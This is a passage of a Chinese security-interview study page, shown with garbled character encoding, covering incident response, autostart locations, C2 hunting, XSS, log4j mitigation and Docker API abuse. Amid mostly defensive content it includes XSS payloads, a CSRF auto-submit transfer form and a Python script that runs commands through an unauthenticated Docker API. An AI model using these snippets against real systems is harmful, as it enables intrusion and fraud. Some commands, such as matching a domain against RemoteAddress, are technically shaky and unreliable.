href="#æµ‹ç»˜å¼•æ“å…³é”®å› ç´ " class="headerlink" title="æµ‹ç»˜å¼•æ“å…³é”®å› ç´ "></a>æµ‹ç»˜å¼•æ“å…³é”®å› ç´ </h3><ul><li><strong>æ•°æ®å‡†ç¡®æ€§</strong>ï¼šç¡®ä¿æµ‹ç»˜æ•°æ®çš„å‡†ç¡®æ€§å’Œå®Œæ•´æ€§ï¼Œè¿™æ˜¯æµ‹ç»˜å¼•æ“çš„åŸºç¡€ã€‚</li><li><strong>æ€§èƒ½ä¼˜åŒ–</strong>ï¼šæé«˜æµ‹ç»˜å¼•æ“çš„è¿è¡Œæ•ˆç‡ï¼Œå‡å°‘æ•°æ®å¤„ç†å’Œæ¸²æŸ“çš„æ—¶é—´ã€‚</li><li><strong>å¯æ‰©å±•æ€§</strong>ï¼šè®¾è®¡å…·æœ‰å¯æ‰©å±•æ€§çš„æ¶æ„ï¼Œä»¥ä¾¿èƒ½å¤Ÿå¤„ç†ä¸æ–­å¢åŠ çš„æ•°æ®é‡å’Œå¤æ‚åº¦ã€‚</li></ul><h3 id="æŸ¥çœ‹ç™»å½•æ—¥å¿—"><a href="#æŸ¥çœ‹ç™»å½•æ—¥å¿—" class="headerlink" title="æŸ¥çœ‹ç™»å½•æ—¥å¿—"></a>æŸ¥çœ‹ç™»å½•æ—¥å¿—</h3><ul><li><strong>Windows</strong>ï¼šå¯ä»¥ä½¿ç”¨äº‹ä»¶æŸ¥çœ‹å™¨æ¥æŸ¥çœ‹ç™»å½•æ—¥å¿—ï¼Œè·¯å¾„ä¸ºâ€œæ§åˆ¶é¢æ¿â€-&gt;â€œç®¡ç†å·¥å…·â€-&gt;â€œäº‹ä»¶æŸ¥çœ‹å™¨â€ã€‚</li><li><strong>Linux</strong>ï¼šå¯ä»¥æŸ¥çœ‹<code>/var/log/auth.log</code>æˆ–<code>/var/log/secure</code>æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶è®°å½•äº†ç³»ç»Ÿçš„è®¤è¯ç›¸å…³ä¿¡æ¯ã€‚</li></ul><h3 id="Windowsè‡ªå¯åŠ¨æ–¹å¼"><a href="#Windowsè‡ªå¯åŠ¨æ–¹å¼" class="headerlink" title="Windowsè‡ªå¯åŠ¨æ–¹å¼"></a>Windowsè‡ªå¯åŠ¨æ–¹å¼</h3><ul><li><strong>æ³¨å†Œè¡¨</strong>ï¼šä¿®æ”¹æ³¨å†Œè¡¨ä¸­çš„<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>å’Œ<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code>é”®å€¼ã€‚</li><li><strong>å¯åŠ¨æ–‡ä»¶å¤¹</strong>ï¼šå°†ç¨‹åºå¿«æ·æ–¹å¼æ”¾ç½®åœ¨â€œå¼€å§‹â€-&gt;â€œç¨‹åºâ€-&gt;â€œå¯åŠ¨â€æ–‡ä»¶å¤¹ä¸­ã€‚</li><li><strong>ä»»åŠ¡è®¡åˆ’</strong>ï¼šä½¿ç”¨ä»»åŠ¡è®¡åˆ’ç¨‹åºæ¥è®¾ç½®ç¨‹åºåœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è‡ªåŠ¨è¿è¡Œã€‚</li></ul><h3 id="æ‰¾å‡ºæœ¨é©¬è¿›ç¨‹"><a href="#æ‰¾å‡ºæœ¨é©¬è¿›ç¨‹" class="headerlink" title="æ‰¾å‡ºæœ¨é©¬è¿›ç¨‹"></a>æ‰¾å‡ºæœ¨é©¬è¿›ç¨‹</h3><ul><li><strong>ç½‘ç»œè¿æ¥åˆ†æ</strong>ï¼šä½¿ç”¨å·¥å…·å¦‚<code>netstat</code>æˆ–<code>TCPView</code>æŸ¥çœ‹å½“å‰çš„ç½‘ç»œè¿æ¥ï¼Œæ‰¾å‡ºä¸C2æœåŠ¡å™¨é€šä¿¡çš„è¿›ç¨‹ã€‚</li><li><strong>è¿›ç¨‹ç›‘æ§</strong>ï¼šä½¿ç”¨å·¥å…·å¦‚<code>Process Explorer</code>ç›‘æ§ç³»ç»Ÿä¸­çš„è¿›ç¨‹ï¼ŒæŸ¥çœ‹å¯ç–‘è¿›ç¨‹çš„æ´»åŠ¨ã€‚</li><li><strong>æ—¥å¿—åˆ†æ</strong>ï¼šæŸ¥çœ‹ç³»ç»Ÿæ—¥å¿—å’Œå®‰å…¨æ—¥å¿—ï¼Œå¯»æ‰¾ä¸æœ¨é©¬æ´»åŠ¨ç›¸å…³çš„è®°å½•ã€‚</li></ul><h3 id="æŒ–çŸ¿æœ¨é©¬åº”æ€¥å¤„ç½®"><a href="#æŒ–çŸ¿æœ¨é©¬åº”æ€¥å¤„ç½®" class="headerlink" title="æŒ–çŸ¿æœ¨é©¬åº”æ€¥å¤„ç½®"></a>æŒ–çŸ¿æœ¨é©¬åº”æ€¥å¤„ç½®</h3><ul><li><strong>éš”ç¦»å—å½±å“ä¸»æœº</strong>ï¼šç«‹å³å°†å—å½±å“çš„ä¸»æœºä»ç½‘ç»œä¸­éš”ç¦»ï¼Œé˜²æ­¢æŒ–çŸ¿æ´»åŠ¨æ‰©æ•£åˆ°å…¶ä»–ç³»ç»Ÿã€‚</li><li><strong>ç»ˆæ­¢æŒ–çŸ¿è¿›ç¨‹</strong>ï¼šä½¿ç”¨ä»»åŠ¡ç®¡ç†å™¨æˆ–å‘½ä»¤è¡Œå·¥å…·ç»ˆæ­¢æŒ–çŸ¿ç›¸å…³çš„è¿›ç¨‹ã€‚</li><li><strong>æ¸…é™¤æŒ–çŸ¿è½¯ä»¶</strong>ï¼šåˆ é™¤æŒ–çŸ¿è½¯ä»¶åŠå…¶ç›¸å…³æ–‡ä»¶ï¼Œç¡®ä¿ç³»ç»Ÿä¸­ä¸å†å­˜åœ¨æŒ–çŸ¿æ´»åŠ¨ã€‚</li><li><strong>æ›´æ–°å’Œæ‰“è¡¥ä¸</strong>ï¼šç¡®ä¿ç³»ç»Ÿå’Œè½¯ä»¶éƒ½æ˜¯æœ€æ–°ç‰ˆæœ¬ï¼Œåº”ç”¨æ‰€æœ‰å®‰å…¨è¡¥ä¸ï¼Œé˜²æ­¢å†æ¬¡è¢«æ„ŸæŸ“ã€‚</li><li><strong>åŠ å¼ºå®‰å…¨é˜²æŠ¤</strong>ï¼šéƒ¨ç½²å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼ˆIDSï¼‰å’Œé˜²ç«å¢™ï¼ŒåŠ å¼ºç³»ç»Ÿçš„å®‰å…¨é˜²æŠ¤æªæ–½ã€‚</li></ul><h3 id="æŸ¥çœ‹ç™»å½•æ—¥å¿—-1"><a href="#æŸ¥çœ‹ç™»å½•æ—¥å¿—-1" class="headerlink" title="æŸ¥çœ‹ç™»å½•æ—¥å¿—"></a>æŸ¥çœ‹ç™»å½•æ—¥å¿—</h3><ul><li><p><strong>Windows</strong>ï¼š</p><ul><li><strong>äº‹ä»¶æŸ¥çœ‹å™¨</strong>ï¼šæ‰“å¼€â€œäº‹ä»¶æŸ¥çœ‹å™¨â€ï¼Œåœ¨â€œWindows æ—¥å¿—â€ä¸‹æŸ¥çœ‹â€œå®‰å…¨â€æ—¥å¿—ï¼Œç­›é€‰â€œ4624â€äº‹ä»¶ï¼ˆæˆåŠŸç™»å½•ï¼‰å’Œâ€œ4625â€äº‹ä»¶ï¼ˆå¤±è´¥ç™»å½•ï¼‰ã€‚</li><li><strong>å‘½ä»¤è¡Œ</strong>ï¼šä½¿ç”¨<code>wevtutil</code>å‘½ä»¤æŸ¥è¯¢ç™»å½•äº‹ä»¶ï¼Œä¾‹å¦‚ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil qe Security /q:*[System[(EventID=4624)]] /f:text</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>Linux</strong>ï¼š</p><ul><li><strong><code>last</code>å‘½ä»¤</strong>ï¼šæŸ¥çœ‹ç™»å½•å†å²ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">last</span><br></pre></td></tr></table></figure></li><li><strong><code>/var/log</code>ç›®å½•</strong>ï¼šæŸ¥çœ‹ç›¸å…³æ—¥å¿—æ–‡ä»¶ï¼Œå¦‚<code>/var/log/auth.log</code>æˆ–<code>/var/log/secure</code>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">tail</span> -f /var/log/auth.log</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="Windowsè‡ªå¯åŠ¨çš„æ–¹å¼"><a href="#Windowsè‡ªå¯åŠ¨çš„æ–¹å¼" class="headerlink" title="Windowsè‡ªå¯åŠ¨çš„æ–¹å¼"></a>Windowsè‡ªå¯åŠ¨çš„æ–¹å¼</h3><ul><li><strong>æ³¨å†Œè¡¨</strong>ï¼š<ul><li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code></li><li><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code></li></ul></li><li><strong>å¯åŠ¨æ–‡ä»¶å¤¹</strong>ï¼š<code>C:\Users\&lt;ç”¨æˆ·å&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></li><li><strong>è®¡åˆ’ä»»åŠ¡</strong>ï¼šé€šè¿‡ä»»åŠ¡è®¡åˆ’ç¨‹åºæˆ–å‘½ä»¤è¡Œå·¥å…·<code>schtasks</code>è®¾ç½®è‡ªå¯åŠ¨ä»»åŠ¡ã€‚</li><li><strong>æœåŠ¡</strong>ï¼šé€šè¿‡<code>services.msc</code>æˆ–å‘½ä»¤è¡Œå·¥å…·<code>sc</code>åˆ›å»ºæœåŠ¡ã€‚</li></ul><h3 id="æ‰¾å‡ºå›è¿C2åœ°å€çš„è¿›ç¨‹"><a href="#æ‰¾å‡ºå›è¿C2åœ°å€çš„è¿›ç¨‹" class="headerlink" title="æ‰¾å‡ºå›è¿C2åœ°å€çš„è¿›ç¨‹"></a>æ‰¾å‡ºå›è¿C2åœ°å€çš„è¿›ç¨‹</h3><p>å‡è®¾C2åœ°å€æ˜¯ä¸€ä¸ªåŸŸåï¼Œä¾‹å¦‚<code>c2.maliciousdomain.com</code>ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•ï¼š</p><ol><li><p><strong>ä½¿ç”¨<code>netstat</code>å‘½ä»¤</strong>ï¼š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr :80</span><br><span class="line">netstat -ano | findstr :443</span><br></pre></td></tr></table></figure><p> æ‰¾åˆ°ä¸C2åŸŸåç›¸å…³çš„è¿æ¥ï¼Œç„¶åé€šè¿‡è¿›ç¨‹IDï¼ˆPIDï¼‰åœ¨ä»»åŠ¡ç®¡ç†å™¨ä¸­æ‰¾åˆ°å¯¹åº”çš„è¿›ç¨‹ã€‚</p></li><li><p><strong>ä½¿ç”¨<code>tcpview</code>å·¥å…·</strong>ï¼šè¿™æ˜¯ä¸€ä¸ªå›¾å½¢åŒ–å·¥å…·ï¼Œå¯ä»¥å®æ—¶æŸ¥çœ‹ç½‘ç»œè¿æ¥å’Œå¯¹åº”çš„è¿›ç¨‹ã€‚</p></li><li><p>**ä½¿ç”¨<code>powershell</code>**ï¼š</p> <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-NetTCPConnection</span> | <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.RemoteAddress <span class="operator">-eq</span> <span class="string">&quot;c2.maliciousdomain.com&quot;</span> &#125; | <span class="built_in">Select-Object</span> OwningProcess</span><br></pre></td></tr></table></figure></li></ol><h3 id="åº”æ€¥å¤„ç½®æŒ–çŸ¿æœ¨é©¬"><a href="#åº”æ€¥å¤„ç½®æŒ–çŸ¿æœ¨é©¬" class="headerlink" title="åº”æ€¥å¤„ç½®æŒ–çŸ¿æœ¨é©¬"></a>åº”æ€¥å¤„ç½®æŒ–çŸ¿æœ¨é©¬</h3><ol><li><p><strong>ç«‹å³åœæ­¢æœåŠ¡</strong>ï¼š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop nginx</span><br><span class="line">systemctl stop apache2</span><br></pre></td></tr></table></figure></li><li><p><strong>éš”ç¦»ç½‘ç»œ</strong>ï¼š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -A OUTPUT -p tcp --dport 80 -j DROP</span><br><span class="line">iptables -A OUTPUT -p tcp --dport 443 -j DROP</span><br></pre></td></tr></table></figure></li><li><p><strong>åˆ†ææ ·æœ¬</strong>ï¼š</p><ul><li>ä½¿ç”¨<code>strings</code>æˆ–<code>hexdump</code>æŸ¥çœ‹å¯ç–‘æ–‡ä»¶ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings /path/to/suspicious_file</span><br></pre></td></tr></table></figure></li><li>ä½¿ç”¨<code>volatility</code>åˆ†æå†…å­˜è½¬å‚¨ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f memory.dmp pslist</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>æ¸…é™¤æœ¨é©¬</strong>ï¼š</p><ul><li>åˆ é™¤æ¶æ„æ–‡ä»¶å’Œè®¡åˆ’ä»»åŠ¡ã€‚</li><li>é‡ç½®å¯†ç å’Œå¯†é’¥ã€‚</li></ul></li><li><p><strong>åŠ å›ºç³»ç»Ÿ</strong>ï¼š</p><ul><li>æ›´æ–°ç³»ç»Ÿå’Œè½¯ä»¶è¡¥ä¸ã€‚</li><li>é…ç½®é˜²ç«å¢™å’Œå…¥ä¾µæ£€æµ‹ç³»ç»Ÿã€‚</li></ul></li></ol><h3 id="æ’æŸ¥C2åŸŸå"><a href="#æ’æŸ¥C2åŸŸå" class="headerlink" title="æ’æŸ¥C2åŸŸå"></a>æ’æŸ¥C2åŸŸå</h3><ol><li><p>**ä½¿ç”¨<code>dig</code>æˆ–<code>nslookup</code>**ï¼š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dig c2.maliciousdomain.com</span><br><span class="line">nslookup c2.maliciousdomain.com</span><br></pre></td></tr></table></figure></li><li><p><strong>æŸ¥çœ‹DNSç¼“å­˜</strong>ï¼š</p><ul><li><strong>Windows</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /displaydns</span><br></pre></td></tr></table></figure></li><li><strong>Linux</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemd-resolve --statistics</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>åˆ†æç½‘ç»œæµé‡</strong>ï¼š</p><ul><li>ä½¿ç”¨<code>tcpdump</code>æ•è·æµé‡ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 -w capture.pcap</span><br></pre></td></tr></table></figure></li><li>ä½¿ç”¨<code>Wireshark</code>åˆ†ææ•è·çš„æµé‡ã€‚</li></ul></li></ol><h3 id="XSSä¿®å¤ä¸åˆ©ç”¨"><a href="#XSSä¿®å¤ä¸åˆ©ç”¨" class="headerlink" title="XSSä¿®å¤ä¸åˆ©ç”¨"></a>XSSä¿®å¤ä¸åˆ©ç”¨</h3><ul><li><p><strong>HTMLç¼–ç </strong>ï¼šå¹¶éæ‰€æœ‰åœ°æ–¹éƒ½å¯ä»¥ç”¨HTMLç¼–ç ä¿®å¤XSSï¼Œç‰¹åˆ«æ˜¯åŠ¨æ€å†…å®¹è¾“å‡ºåˆ°å±æ€§å€¼æˆ–JavaScriptä¸Šä¸‹æ–‡ä¸­æ—¶ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span>Click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>åœ¨è®¾ç½®äº†HttpOnlyçš„æƒ…å†µä¸‹åˆ©ç”¨XSS</strong>ï¼š</p><ul><li><strong>Cookieçªƒå–</strong>ï¼šå³ä½¿è®¾ç½®äº†HttpOnlyï¼Œæ”»å‡»è€…ä»ç„¶å¯ä»¥é€šè¿‡XSSè¯»å–éHttpOnlyçš„cookieï¼Œæˆ–è€…é€šè¿‡å…¶ä»–æ–¹å¼ï¼ˆå¦‚CSRFï¼‰åˆ©ç”¨æ¼æ´ã€‚</li><li><strong>DOM-based XSS</strong>ï¼šé€šè¿‡æ“ä½œDOMæ¥æ‰§è¡Œæ¶æ„ä»£ç ï¼Œä¾‹å¦‚ï¼š<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">hash</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>ä»£ç ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨Pythonå’ŒSeleniumæ¨¡æ‹ŸXSSæ”»å‡»</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line">driver.get(<span class="string">&quot;http://vulnerable-site.com/page?param=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;</span>)</span><br><span class="line">alert = driver.switch_to.alert</span><br><span class="line"><span class="built_in">print</span>(alert.text)</span><br><span class="line">alert.accept()</span><br></pre></td></tr></table></figure></li><li><p><strong>åˆ©ç”¨XSSç»•è¿‡HttpOnly</strong>ï¼š</p><ul><li><strong>CSRFæ”»å‡»</strong>ï¼šå³ä½¿æ— æ³•è¯»å–cookieï¼Œæ”»å‡»è€…ä»ç„¶å¯ä»¥å‘é€è¯·æ±‚åˆ°ç›®æ ‡ç½‘ç«™ï¼Œæ‰§è¡ŒæŸäº›æ“ä½œã€‚</li><li><strong>ä¼šè¯å›ºå®š</strong>ï¼šæ”»å‡»è€…å¯ä»¥å›ºå®šç”¨æˆ·çš„ä¼šè¯IDï¼Œç„¶ååˆ©ç”¨XSSè¿›è¡Œè¿›ä¸€æ­¥æ”»å‡»ã€‚<br><a href="https://blog.csdn.net/m0_51683653/article/details/127553777">https://blog.csdn.net/m0_51683653/article/details/127553777</a></li></ul></li><li><p><strong>ä»£ç ç¤ºä¾‹ï¼ˆCSRFæ”»å‡»ï¼‰</strong>ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://vulnerable-site.com/transfer&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;to&quot;</span> <span class="attr">value</span>=<span class="string">&quot;attacker_account&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="log4jé™¤äº†å‡çº§ç‰ˆæœ¬å¤–è¿˜æœ‰ä»€ä¹ˆä¿®å¤æ–¹å¼"><a href="#log4jé™¤äº†å‡çº§ç‰ˆæœ¬å¤–è¿˜æœ‰ä»€ä¹ˆä¿®å¤æ–¹å¼" class="headerlink" title="log4jé™¤äº†å‡çº§ç‰ˆæœ¬å¤–è¿˜æœ‰ä»€ä¹ˆä¿®å¤æ–¹å¼"></a>log4jé™¤äº†å‡çº§ç‰ˆæœ¬å¤–è¿˜æœ‰ä»€ä¹ˆä¿®å¤æ–¹å¼</h3><p>é™¤äº†å‡çº§log4jç‰ˆæœ¬å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ä¿®å¤log4jæ¼æ´ï¼š</p><ol><li><p><strong>ç¦ç”¨JNDIæŸ¥æ‰¾</strong>ï¼šåœ¨log4jçš„é…ç½®æ–‡ä»¶ä¸­ï¼Œé€šè¿‡è®¾ç½®<code>log4j2.formatMsgNoLookups=true</code>æ¥ç¦ç”¨JNDIæŸ¥æ‰¾åŠŸèƒ½ï¼Œä»è€Œé˜²æ­¢è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">log4j2.formatMsgNoLookups</span>=<span class="string">true</span></span><br></pre></td></tr></table></figure></li><li><p><strong>é™åˆ¶ç½‘ç»œè¿æ¥</strong>ï¼šé€šè¿‡é˜²ç«å¢™è§„åˆ™é™åˆ¶log4jæ—¥å¿—åº“çš„ç½‘ç»œè¿æ¥ï¼Œé˜²æ­¢å…¶è®¿é—®å¤–éƒ¨æ¶æ„æœåŠ¡å™¨ã€‚</p></li><li><p><strong>ç›‘æ§å’Œå®¡è®¡</strong>ï¼šå¯ç”¨æ—¥å¿—ç›‘æ§å·¥å…·ï¼Œå®æ—¶ç›‘æ§log4jçš„æ—¥å¿—è¾“å‡ºï¼ŒåŠæ—¶å‘ç°å¼‚å¸¸è¡Œä¸ºã€‚</p></li></ol><h3 id="æ‹¿åˆ°ä¸€ä¸ªwebshellæ€ä¹ˆåˆ¤æ–­ä»–æ˜¯åœ¨dockeré‡Œè¿˜æ˜¯å®æœºé‡Œ"><a href="#æ‹¿åˆ°ä¸€ä¸ªwebshellæ€ä¹ˆåˆ¤æ–­ä»–æ˜¯åœ¨dockeré‡Œè¿˜æ˜¯å®æœºé‡Œ" class="headerlink" title="æ‹¿åˆ°ä¸€ä¸ªwebshellæ€ä¹ˆåˆ¤æ–­ä»–æ˜¯åœ¨dockeré‡Œè¿˜æ˜¯å®æœºé‡Œ"></a>æ‹¿åˆ°ä¸€ä¸ªwebshellæ€ä¹ˆåˆ¤æ–­ä»–æ˜¯åœ¨dockeré‡Œè¿˜æ˜¯å®æœºé‡Œ</h3><p>å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•åˆ¤æ–­webshellæ˜¯å¦è¿è¡Œåœ¨Dockerå®¹å™¨ä¸­ï¼š</p><ol><li><p><strong>æ£€æŸ¥ç¯å¢ƒå˜é‡</strong>ï¼šDockerå®¹å™¨ä¸­é€šå¸¸ä¼šè®¾ç½®ä¸€äº›ç‰¹å®šçš„ç¯å¢ƒå˜é‡ï¼Œå¦‚<code>container=docker</code>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printenv</span> | grep -i docker</span><br></pre></td></tr></table></figure></li><li><p><strong>æ£€æŸ¥è¿›ç¨‹</strong>ï¼šDockerå®¹å™¨ä¸­çš„è¿›ç¨‹è¿è¡Œåœ¨å®¹å™¨çš„å‘½åç©ºé—´ä¸­ï¼Œå¯ä»¥é€šè¿‡æ£€æŸ¥<code>/proc/1/cgroup</code>æ–‡ä»¶æ¥åˆ¤æ–­ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/1/cgroup</span><br></pre></td></tr></table></figure><p>å¦‚æœè¾“å‡ºä¸­åŒ…å«<code>docker</code>æˆ–<code>containerd</code>ï¼Œåˆ™è¯´æ˜è¿è¡Œåœ¨Dockerå®¹å™¨ä¸­ã€‚</p></li><li><p><strong>æ£€æŸ¥æ–‡ä»¶ç³»ç»Ÿ</strong>ï¼šDockerå®¹å™¨çš„æ–‡ä»¶ç³»ç»Ÿé€šå¸¸ä¼šåŒ…å«<code>/docker</code>ç›®å½•æˆ–ç±»ä¼¼æ ‡è¯†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> /docker</span><br></pre></td></tr></table></figure></li></ol><h3 id="Docker-APIæœªæˆæƒæ¼æ´ä»‹ç»"><a href="#Docker-APIæœªæˆæƒæ¼æ´ä»‹ç»" class="headerlink" title="Docker APIæœªæˆæƒæ¼æ´ä»‹ç»"></a>Docker APIæœªæˆæƒæ¼æ´ä»‹ç»</h3><p>Docker APIæœªæˆæƒè®¿é—®æ¼æ´æ˜¯æŒ‡Dockerå®ˆæŠ¤è¿›ç¨‹æš´éœ²äº†APIç«¯ç‚¹ï¼Œä¸”æœªè¿›è¡Œèº«ä»½éªŒè¯ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><ol><li><p><strong>æ¼æ´æè¿°</strong>ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€HTTPè¯·æ±‚åˆ°Docker APIç«¯ç‚¹ï¼Œæ‰§è¡Œå®¹å™¨æ“ä½œï¼Œå¦‚åˆ›å»ºã€åˆ é™¤ã€æ‰§è¡Œå‘½ä»¤ç­‰ã€‚</p></li><li><p><strong>æ¼æ´åˆ©ç”¨</strong>ï¼šä»¥ä¸‹æ˜¯ä¸€ä¸ªåˆ©ç”¨Docker APIæœªæˆæƒè®¿é—®æ¼æ´æ‰§è¡Œå‘½ä»¤çš„ç¤ºä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://&lt;docker_api_ip&gt;:2375/containers/create&quot;</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;Image&quot;</span>: <span class="string">&quot;alpine&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cmd&quot;</span>: [<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;touch /tmp/pwned&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, json=payload)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure></li><li><p><strong>ä¿®å¤å»ºè®®</strong>ï¼š</p><ul><li>ç¦ç”¨Docker APIçš„æœªæˆæƒè®¿é—®ã€‚</li><li>ä½¿ç”¨TLSåŠ å¯†é€šä¿¡ã€‚</li><li>é…ç½®é˜²ç«å¢™è§„åˆ™ï¼Œé™åˆ¶å¯¹Docker APIçš„è®¿é—®ã€‚</li></ul></li></ol><h3 id="æœºå™¨é‡å¯åå†…å­˜é©¬è¿˜åœ¨å—"><a href="#æœºå™¨é‡å¯åå†…å­˜é©¬è¿˜åœ¨å—" class="headerlink" title="æœºå™¨é‡å¯åå†…å­˜é©¬è¿˜åœ¨å—"></a>æœºå™¨é‡å¯åå†…å­˜é©¬è¿˜åœ¨å—</h3><p>å†…å­˜é©¬ï¼ˆMemory Malwareï¼‰æ˜¯é©»ç•™åœ¨å†…å­˜ä¸­çš„æ¶æ„ä»£ç ï¼Œé€šå¸¸ä¸ä¼šåœ¨æœºå™¨é‡å¯åç»§ç»­å­˜åœ¨ã€‚å› 